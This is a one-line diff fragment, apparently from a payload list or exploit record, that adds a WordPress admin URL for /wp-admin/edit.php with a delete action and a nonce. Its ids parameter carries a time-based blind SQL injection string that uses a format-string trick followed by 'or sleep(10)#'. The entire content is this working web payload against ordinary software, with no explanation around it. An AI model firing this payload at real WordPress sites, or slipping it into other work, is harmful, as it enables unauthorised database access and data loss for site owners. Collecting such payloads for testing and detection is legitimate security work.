@@ -1,0 +1,1 @@
+/wp-admin/edit.php?action=delete&_wpnonce=301ee97c09&ids=55 %1$%s or sleep(10)#
